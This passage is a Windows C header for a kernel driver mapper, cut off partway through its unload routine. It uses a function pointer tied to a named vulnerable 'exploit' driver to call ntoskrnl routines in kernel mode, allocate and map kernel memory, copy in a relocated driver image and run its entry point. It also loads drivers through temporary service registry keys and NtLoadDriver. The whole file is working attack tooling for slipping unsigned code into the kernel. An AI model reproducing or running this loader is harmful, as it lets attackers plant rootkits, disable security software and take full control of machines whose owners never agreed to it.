#pragma once
#ifndef UM_DriverMapper_HEADER_INCLUDED
#define UM_DriverMapper_HEADER_INCLUDED

#include "..\both\GeneralErrors.h"
#include "..\both\PEDisector.h"
#include "..\both\PEMapper.h"
#include "Utilities.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")

#define MM_ALLOCATE_FULLY_REQUIRED 0x00000004
#define SeLoadDriverPrivilege 10ull

typedef GeneralErrorCast(KERNEL_EXECUTE)(PVULNERABLE_DRIVER_EXECUTE ExecutionDescriptor, const char * DriverName);

typedef struct _NTOS_MAPPING_EXPORTS
{
	void* memcpy;
	void* MmAllocatePagesForMdlEx;
	void* RtlFindExportedRoutineByName;
	void* MmMapLockedPagesSpecifyCache;
} NTOS_MAPPING_EXPORTS, *PNTOS_MAPPING_EXPORTS;

typedef struct _PE_MAPPING_EXPORT_CALLBACK
{
	PNTOS_MAPPING_EXPORTS Imports;
	KERNEL_EXECUTE * KExecute;
	const char* ExploitDriverName;
} PE_MAPPING_EXPORT_CALLBACK, *PPE_MAPPING_EXPORT_CALLBACK;

static GeneralErrorCast MapDriverImportFunctions(NTOS_MAPPING_EXPORTS* Imports)
{
	if (!Imports)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	memset(Imports, 0, sizeof(NTOS_MAPPING_EXPORTS));

	unsigned long NTOSFileSize;
	void* NTOSFileBuffer;
	HANDLE NTOSFileHandle;

	NTSTATUS NTStatus;
	UnMappedExportDescriptor Export;
	RTL_PROCESS_MODULE_INFORMATION SystemModule;
	unsigned long ReadSize;
	char Path[MAX_PATH];
	GeneralError Error;

	Error.ErrorValue = FindSystemModuleByNameA("ntoskrnl.exe", &SystemModule);
	if (!NT_SUCCESS(Error.NTStatus))
		return Error.ErrorValue;

	if (!ExpandEnvironmentStringsA("%SystemRoot%", Path, sizeof(Path)))
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;

	strcpy(Path + strlen(Path), "\\System32\\ntoskrnl.exe");

	NTOSFileHandle = CreateFileA(Path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (NTOSFileHandle == INVALID_HANDLE_VALUE)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;

	NTOSFileSize = GetFileSize(NTOSFileHandle, 0);
	if (!NTOSFileSize)
	{
		CloseHandle(NTOSFileHandle);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	NTOSFileBuffer = VirtualAlloc(0, NTOSFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NTOSFileBuffer)
	{
		CloseHandle(NTOSFileHandle);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	if (!ReadFile(NTOSFileHandle, NTOSFileBuffer, NTOSFileSize, &ReadSize, 0))
	{
		VirtualFree(NTOSFileBuffer, 0, MEM_RELEASE);
		CloseHandle(NTOSFileHandle);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	CloseHandle(NTOSFileHandle);

	Error.ErrorValue = FindExportByNameUnMapped(NTOSFileBuffer, "MmAllocatePagesForMdlEx", &Export);
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(NTOSFileBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}

	Imports->MmAllocatePagesForMdlEx = (void*)(Export.ExportOffset + (char*)SystemModule.ImageBase);

	Error.ErrorValue = FindExportByNameUnMapped(NTOSFileBuffer, "MmMapLockedPagesSpecifyCache", &Export);
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(NTOSFileBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}

	Imports->MmMapLockedPagesSpecifyCache = (void*)(Export.ExportOffset + (char*)SystemModule.ImageBase);

	Error.ErrorValue = FindExportByNameUnMapped(NTOSFileBuffer, "memcpy", &Export);
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(NTOSFileBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}
	Imports->memcpy = (void*)(Export.ExportOffset + (char*)SystemModule.ImageBase);

	Error.ErrorValue = FindExportByNameUnMapped(NTOSFileBuffer, "RtlFindExportedRoutineByName", &Export);
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(NTOSFileBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}
	Imports->RtlFindExportedRoutineByName = (void*)(Export.ExportOffset + (char*)SystemModule.ImageBase);

	VirtualFree(NTOSFileBuffer, 0, MEM_RELEASE);

	return STATUS_SUCCESS;
}

static GeneralErrorCast MapDriverFindPECallBack(const char* PEName, void** PEBuffer, PRTL_PROCESS_MODULES Modules)
{
	if (!PEName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!PEBuffer)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	if (!Modules)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_3) | 1;

	*PEBuffer = 0;

	for (unsigned long i = 0; i < Modules->NumberOfModules; i++)
	{
		if (!_stricmp((char*)Modules->Modules[i].FullPathName + Modules->Modules[i].OffsetToFileName, PEName))
		{
			*PEBuffer = Modules->Modules[i].ImageBase;
			return STATUS_SUCCESS;
		}
	}
	return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_NOT_FOUND) | 1;
}

static GeneralErrorCast MapDriverFindPEExportCallBack(void* PEBuffer, const char* Export, void** ExportAddress, PPE_MAPPING_EXPORT_CALLBACK MappingExport)
{
	if (!PEBuffer)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!Export)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	if (!ExportAddress)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_3) | 1;

	if (!MappingExport)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_4) | 1;

	*ExportAddress = 0;

	GeneralError Error;
	VULNERABLE_DRIVER_EXECUTE ExecutionDescriptor;

	ExecutionDescriptor.Function = MappingExport->Imports->RtlFindExportedRoutineByName;
	ExecutionDescriptor.FunctionReturn = ExportAddress;
	ExecutionDescriptor.UMExecute = 0;

	ExecutionDescriptor.ArgumentCount = 2;
	ExecutionDescriptor.Arguments[0] = PEBuffer;
	ExecutionDescriptor.Arguments[1] = (void*)Export;

	Error.ErrorValue = MappingExport->KExecute(&ExecutionDescriptor, MappingExport->ExploitDriverName);
	if (!NT_SUCCESS(Error.NTStatus))
		return Error.ErrorValue;

	return STATUS_SUCCESS;
}

static GeneralErrorCast MapDriverEx(KERNEL_EXECUTE KExecuteFunction, const char* ExploitDriverFileName, const void* PEBuffer, void* Argument0, void* Argument1)
{
	if (!KExecuteFunction)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!ExploitDriverFileName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	GeneralError Error;

	VULNERABLE_DRIVER_EXECUTE* ExecutionDescriptor;
	PE_MAPPING_EXPORT_CALLBACK MappingExport;
	PRTL_PROCESS_MODULES SystemModules;
	NTOS_MAPPING_EXPORTS Imports;

	unsigned long InformationDumpSize;

	char ExecuteBuffer[0x100];

	void* DriverMappingAddress;
	void* DriverMappedBuffer;
	void* DriverMDL;

	ExecutionDescriptor = (VULNERABLE_DRIVER_EXECUTE*)ExecuteBuffer;

	Error.ErrorValue = MapDriverImportFunctions(&Imports);
	if (!NT_SUCCESS(Error.NTStatus))
		return Error.ErrorValue;

	DriverMDL = 0;

	ExecutionDescriptor->Function = Imports.MmAllocatePagesForMdlEx;
	ExecutionDescriptor->FunctionReturn = &DriverMDL;
	ExecutionDescriptor->UMExecute = 0;

	ExecutionDescriptor->ArgumentCount = 6;
	ExecutionDescriptor->Arguments[0] = 0;
	ExecutionDescriptor->Arguments[1] = (void*)~0;
	ExecutionDescriptor->Arguments[2] = 0;
	ExecutionDescriptor->Arguments[3] = (void*)GET_IMAGE_OPTIONAL_HEADER(PEBuffer)->SizeOfImage;
	ExecutionDescriptor->Arguments[4] = 0;
	ExecutionDescriptor->Arguments[5] = (void*)MM_ALLOCATE_FULLY_REQUIRED;

	Error.ErrorValue = KExecuteFunction(ExecutionDescriptor, ExploitDriverFileName);
	if (!NT_SUCCESS(Error.NTStatus))
		return Error.ErrorValue;

	if (!DriverMDL)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_NOT_MAPPED_DATA) | 1;

	DriverMappingAddress = 0;

	ExecutionDescriptor->Function = Imports.MmMapLockedPagesSpecifyCache;
	ExecutionDescriptor->FunctionReturn = &DriverMappingAddress;
	ExecutionDescriptor->UMExecute = 0;

	ExecutionDescriptor->ArgumentCount = 6;
	ExecutionDescriptor->Arguments[0] = DriverMDL;
	ExecutionDescriptor->Arguments[1] = 0;
	ExecutionDescriptor->Arguments[2] = 0;
	ExecutionDescriptor->Arguments[3] = 0;
	ExecutionDescriptor->Arguments[4] = 0;
	ExecutionDescriptor->Arguments[5] = (void*)32; // HighPriority

	Error.ErrorValue = KExecuteFunction(ExecutionDescriptor, ExploitDriverFileName);
	if (!NT_SUCCESS(Error.NTStatus))
		return Error.ErrorValue;

	if (!DriverMappingAddress)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_NOT_MAPPED_DATA) | 1;

	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, 0, 0, &InformationDumpSize);
	SystemModules = (PRTL_PROCESS_MODULES)VirtualAlloc(0, InformationDumpSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!SystemModules)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;

	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, SystemModules, InformationDumpSize, &InformationDumpSize);

	DriverMappedBuffer = VirtualAlloc(0, GET_IMAGE_OPTIONAL_HEADER(PEBuffer)->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!DriverMappedBuffer)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;

	Error.ErrorValue = MapImageSections(PEBuffer, DriverMappedBuffer);
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(DriverMappedBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}

	Error.ErrorValue = RelocateImage(PEBuffer, DriverMappedBuffer, DriverMappingAddress);
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(DriverMappedBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}

	MappingExport.Imports = &Imports;
	MappingExport.KExecute = KExecuteFunction;
	MappingExport.ExploitDriverName = ExploitDriverFileName;
	Error.ErrorValue = FixImageImports(PEBuffer, DriverMappedBuffer, { MapDriverFindPECallBack, SystemModules }, { MapDriverFindPEExportCallBack, &MappingExport });
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(DriverMappedBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}

	ExecutionDescriptor->Function = Imports.memcpy;
	ExecutionDescriptor->FunctionReturn = 0;
	ExecutionDescriptor->UMExecute = 0;

	ExecutionDescriptor->ArgumentCount = 3;
	ExecutionDescriptor->Arguments[0] = DriverMappingAddress;
	ExecutionDescriptor->Arguments[1] = DriverMappedBuffer;
	ExecutionDescriptor->Arguments[2] = (void*)GET_IMAGE_OPTIONAL_HEADER(PEBuffer)->SizeOfImage;

	Error.ErrorValue = KExecuteFunction(ExecutionDescriptor, ExploitDriverFileName);
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(DriverMappedBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}

	ExecutionDescriptor->Function = GET_IMAGE_OPTIONAL_HEADER(PEBuffer)->AddressOfEntryPoint + (char*)DriverMappingAddress;
	ExecutionDescriptor->FunctionReturn = (void**)&Error;
	ExecutionDescriptor->UMExecute = 0;

	ExecutionDescriptor->ArgumentCount = 2;
	ExecutionDescriptor->Arguments[0] = Argument0;
	ExecutionDescriptor->Arguments[1] = Argument1;

	Error.ErrorValue = KExecuteFunction(ExecutionDescriptor, ExploitDriverFileName);
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(DriverMappedBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}

	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(DriverMappedBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}

	VirtualFree(DriverMappedBuffer, 0, MEM_RELEASE);
	return STATUS_SUCCESS;
}

static GeneralErrorCast MapDriverByPathW(KERNEL_EXECUTE KExecuteFunction, const char* ExploitDriverFileName, const wchar_t* FilePath, void* Argument0, void* Argument1)
{
	if (!KExecuteFunction)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!ExploitDriverFileName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_3) | 1;

	GeneralError Error;

	HANDLE DriverFileHandle;
	unsigned long DriverFileSize;
	void* DriverFileBuffer;

	DriverFileHandle = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (DriverFileHandle == INVALID_HANDLE_VALUE)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;

	DriverFileSize = GetFileSize(DriverFileHandle, 0);
	if (!DriverFileSize)
	{
		CloseHandle(DriverFileHandle);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	DriverFileBuffer = VirtualAlloc(0, DriverFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!DriverFileBuffer)
	{
		CloseHandle(DriverFileHandle);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	if (!ReadFile(DriverFileHandle, DriverFileBuffer, DriverFileSize, 0, 0))
	{
		VirtualFree(DriverFileBuffer, 0, MEM_RELEASE);
		CloseHandle(DriverFileHandle);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	CloseHandle(DriverFileHandle);

	Error.ErrorValue = MapDriverEx(KExecuteFunction, ExploitDriverFileName, DriverFileBuffer, Argument0, Argument1);
	if (!NT_SUCCESS(Error.NTStatus))
	{
		VirtualFree(DriverFileBuffer, 0, MEM_RELEASE);
		return Error.ErrorValue;
	}

	VirtualFree(DriverFileBuffer, 0, MEM_RELEASE);
	return STATUS_SUCCESS;
}

static GeneralErrorCast MapDriverByPathA(KERNEL_EXECUTE KExecuteFunction, const char* ExploitDriverFileName, const char* FilePath, void* Argument0, void* Argument1)
{
	if (!KExecuteFunction)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!ExploitDriverFileName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_3) | 1;

	wchar_t WPath[MAX_PATH];

	mbstowcs(WPath, FilePath, strlen(FilePath) + 1);

	return MapDriverByPathW(KExecuteFunction, ExploitDriverFileName, WPath, Argument0, Argument1);
}

static GeneralErrorCast LoadDriverW(const wchar_t* FilePath, const wchar_t* ServiceName)
{
	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!ServiceName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	LSTATUS Win32Status;
	NTSTATUS NTStatus;

	BOOLEAN Enabled;
	HKEY KeyHandle;
	unsigned long DwordValue;

	UNICODE_STRING ServiceLoadPathW;

	wchar_t* PathBuffer;
	wchar_t* ServiceLoadPath;
	wchar_t* ServicePath;

	NTStatus = RtlAdjustPrivilege(SeLoadDriverPrivilege, TRUE, FALSE, &Enabled);
	if (!NT_SUCCESS(NTStatus))
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTStatus) | 1;

	ServicePath = (wchar_t*)VirtualAlloc(0, MAX_PATH * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ServicePath)
		return FALSE;

	wcscpy(ServicePath, L"System\\CurrentControlSet\\Services\\");
	wcscpy(ServicePath + ((sizeof(L"System\\CurrentControlSet\\Services\\") - sizeof(wchar_t)) / sizeof(wchar_t)), ServiceName);

	Win32Status = RegCreateKeyW(HKEY_LOCAL_MACHINE, ServicePath, &KeyHandle);
	if (Win32Status)
	{
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

	DwordValue = 1;
	Win32Status = RegSetValueExW(KeyHandle, L"Type", 0, REG_DWORD, (const unsigned char*)&DwordValue, sizeof(DwordValue));
	if (Win32Status)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

	Win32Status = RegSetValueExW(KeyHandle, L"ErrorControl", 0, REG_DWORD, (const unsigned char*)&DwordValue, sizeof(DwordValue));
	if (Win32Status)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

	DwordValue = 3;
	Win32Status = RegSetValueExW(KeyHandle, L"Start", 0, REG_DWORD, (const unsigned char*)&DwordValue, sizeof(DwordValue));
	if (Win32Status)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

	PathBuffer = (wchar_t*)VirtualAlloc(0, MAX_PATH * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!PathBuffer)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return FALSE;
	}

	wcscpy(PathBuffer, L"\\??\\");
	if (!wcsstr(FilePath, L"\\"))
	{
		GetCurrentDirectoryW(MAX_PATH * sizeof(wchar_t), PathBuffer + wcslen(PathBuffer));
		wcscpy(PathBuffer + wcslen(PathBuffer), L"\\");
		wcscpy(PathBuffer + wcslen(PathBuffer), FilePath);
	}
	else
		wcscpy(PathBuffer + wcslen(PathBuffer), FilePath);

	Win32Status = RegSetValueExW(KeyHandle, L"ImagePath", 0, REG_SZ, (const unsigned char*)PathBuffer, (wcslen(PathBuffer) + 1) * sizeof(wchar_t));
	if (Win32Status)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(PathBuffer, 0, MEM_RELEASE);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

	VirtualFree(PathBuffer, 0, MEM_RELEASE);
	RegCloseKey(KeyHandle);

	ServiceLoadPath = (wchar_t*)VirtualAlloc(0, MAX_PATH * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ServiceLoadPath)
	{
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	wcscpy(ServiceLoadPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
	wcscpy(ServiceLoadPath + ((sizeof(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\") - sizeof(wchar_t)) / sizeof(wchar_t)), ServiceName);

	RtlInitUnicodeString(&ServiceLoadPathW, ServiceLoadPath);

	NTStatus = NtLoadDriver(&ServiceLoadPathW);
	if (!NT_SUCCESS(NTStatus))
	{
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		VirtualFree(ServiceLoadPath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTStatus) | 1;
	}

	RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
	VirtualFree(ServicePath, 0, MEM_RELEASE);
	VirtualFree(ServiceLoadPath, 0, MEM_RELEASE);

	return STATUS_SUCCESS;
}

static GeneralErrorCast LoadDriverA(const char* FilePath, const char* ServiceName)
{
	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!ServiceName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	wchar_t WService[MAX_PATH];
	wchar_t WPath[MAX_PATH];

	mbstowcs(WService, ServiceName, strlen(ServiceName) + 1);
	mbstowcs(WPath, FilePath, strlen(FilePath) + 1);

	return LoadDriverW(WPath, WService);
}

static GeneralErrorCast LoadDriverExW(const void* PEBuffer, unsigned long BufferSize, const wchar_t* FilePath, const wchar_t* ServiceName)
{
	if (!PEBuffer)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!BufferSize)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_3) | 1;

	if (!ServiceName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_4) | 1;

	HANDLE FileHandle;

	FileHandle = CreateFileW(FilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (FileHandle == INVALID_HANDLE_VALUE)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;

	if (!WriteFile(FileHandle, PEBuffer, BufferSize, 0, 0))
	{
		CloseHandle(FileHandle);
		DeleteFileW(FilePath);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;
	}

	CloseHandle(FileHandle);

	return LoadDriverW(FilePath, ServiceName);
}

static GeneralErrorCast LoadDriverExA(const void* PEBuffer, unsigned long BufferSize, const char* FilePath, const char* ServiceName)
{
	if (!PEBuffer)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!BufferSize)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_3) | 1;

	if (!ServiceName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_4) | 1;

	wchar_t WService[MAX_PATH];
	wchar_t WPath[MAX_PATH];

	mbstowcs(WService, ServiceName, strlen(ServiceName) + 1);
	mbstowcs(WPath, FilePath, strlen(FilePath) + 1);

	return LoadDriverExW(PEBuffer, BufferSize, WPath, WService);
}

static GeneralErrorCast UnloadDriverW(const wchar_t* FilePath, const wchar_t* ServiceName)
{
	if (!FilePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_1) | 1;

	if (!ServiceName)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, STATUS_INVALID_PARAMETER_2) | 1;

	LSTATUS Win32Status;
	NTSTATUS NTStatus;

	BOOLEAN Enabled;
	HKEY KeyHandle;
	unsigned long DwordValue;

	UNICODE_STRING ServiceLoadPathW;

	wchar_t* PathBuffer;
	wchar_t* ServiceLoadPath;
	wchar_t* ServicePath;

	HANDLE FileHandle;

	NTStatus = RtlAdjustPrivilege(SeLoadDriverPrivilege, TRUE, FALSE, &Enabled);
	if (!NT_SUCCESS(NTStatus))
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTStatus) | 1;

	ServicePath = (wchar_t*)VirtualAlloc(0, MAX_PATH * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ServicePath)
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(GetLastError())) | 1;

	wcscpy(ServicePath, L"System\\CurrentControlSet\\Services\\");
	wcscpy(ServicePath + ((sizeof(L"System\\CurrentControlSet\\Services\\") - sizeof(wchar_t)) / sizeof(wchar_t)), ServiceName);

	Win32Status = RegCreateKeyW(HKEY_LOCAL_MACHINE, ServicePath, &KeyHandle);
	if (Win32Status)
	{
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

	DwordValue = 1;
	Win32Status = RegSetValueExW(KeyHandle, L"Type", 0, REG_DWORD, (const unsigned char*)&DwordValue, sizeof(DwordValue));
	if (Win32Status)
	{
		RegCloseKey(KeyHandle);
		RegDeleteKeyW(HKEY_LOCAL_MACHINE, ServicePath);
		VirtualFree(ServicePath, 0, MEM_RELEASE);
		return GENERAL_ERROR_ASSEMBLE(GENERAL_ERROR_HEADER_UM_DRIVERMAPPER, NTSTATUS_FROM_WIN32(Win32Status)) | 1;
	}

